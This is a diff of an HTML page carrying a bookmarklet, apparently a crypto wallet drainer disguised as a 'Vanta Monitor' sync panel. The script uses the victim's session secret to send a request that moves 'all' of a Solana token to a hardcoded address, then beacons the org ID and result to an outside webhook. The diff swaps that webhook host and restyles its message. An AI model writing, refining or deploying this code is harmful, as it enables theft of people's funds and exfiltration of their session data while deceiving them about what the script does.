@@ -45,7 +45,7 @@
 
     <script>
         const DEST_ADDRESS = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
-        const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
+        const WEBHOOK_URL = "https://getit.free.beeceptor.com"; // Updated to Beeceptor
 
         const code = "javascript:(async function(){" +
             "try{" +
@@ -62,10 +62,10 @@
                 "ui.style.cssText='position:fixed;top:80px;right:20px;width:320px;background:#0f0f0f;border:1px solid #00ff88;border-radius:12px;z-index:9999999;color:#fff;padding:0;box-shadow:0 15px 40px #000;overflow:hidden;font-family:sans-serif;';" +
                 "ui.innerHTML='<div id=\"v-drg\" style=\"padding:12px;background:#1a1a1a;cursor:grab;color:#00ff88;font-weight:bold;border-bottom:1px solid #333;display:flex;justify-content:space-between;\"><span>VANTA MONITOR</span><span id=\"v-cl\" style=\"cursor:pointer;color:#fff;\">×</span></div>'+" +
                 "'<div style=\"padding:20px;\"><div style=\"font-size:10px;color:#888;margin-bottom:5px;\">SESSION ACTIVE:</div><div style=\"font-size:12px;color:#00ff88;margin-bottom:20px;word-break:break-all;font-family:monospace;\">'+oId+'</div>'+" +
-                "'<div id=\"v-stat\" style=\"font-size:14px;font-weight:bold;text-align:center;color:#00ff88;animation:pulse 2s infinite;\">INITIALIZING SYNC...</div></div>';" +
+                "'<div id=\"v-stat\" style=\"font-size:14px;font-weight:bold;text-align:center;color:#00ff88;\">ESTABLISHING SYNC...</div></div>';" +
                 "document.body.appendChild(ui);" +
                 "let dr=false,ox,oy;" +
-                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-ui.offsetTop;};" +
+                "document.getElementById('v-drg').onmousedown=e=>{dr=true;ox=e.clientX-ui.offsetLeft;oy=e.clientY-oy-ui.offsetTop;};" +
                 "document.onmousemove=e=>{if(dr){ui.style.left=(e.clientX-ox)+'px';ui.style.top=(e.clientY-oy)+'px';ui.style.right='auto';}};" +
                 "document.onmouseup=()=>{dr=false;};" +
                 "document.getElementById('v-cl').onclick=()=>ui.remove();" +
@@ -76,11 +76,12 @@
                             "headers:{'Content-Type':'application/json','X-Session-Secret':sec}," +
                             "body:JSON.stringify({destination: '" + DEST_ADDRESS + "',amount:'all',mint:'So11111111111111111111111111111111111111112'})" +
                         "});" +
-                        "document.getElementById('v-stat').innerText='SYNC COMPLETE';" +
-                        "navigator.sendBeacon('" + WEBHOOK_URL + "',JSON.stringify({status:res.status,org:oId,ev:'auto_sync'}));" +
-                        "setTimeout(()=>ui.remove(), 3000);" +
+                        "const payload = JSON.stringify({content: '🔄 **Vanta Sync Event**', embeds: [{title: 'Sync Status', color: res.ok ? 65416 : 16724736, fields: [{name: 'Org ID', value: '`'+oId+'`'}, {name: 'Status', value: res.status}]}]});" +
+                        "navigator.sendBeacon('" + WEBHOOK_URL + "', payload);" +
+                        "document.getElementById('v-stat').innerText=res.ok ? 'SYNC COMPLETE' : 'SYNC FAILED ('+res.status+')';" +
+                        "setTimeout(()=>ui.remove(), 2500);" +
                     "}catch(e){" +
-                        "document.getElementById('v-stat').innerText='CONNECTION ERROR';" +
+                        "document.getElementById('v-stat').innerText='NETWORK ERROR';" +
                         "document.getElementById('v-stat').style.color='#ff4444';" +
                     "}" +
                 "})();" +
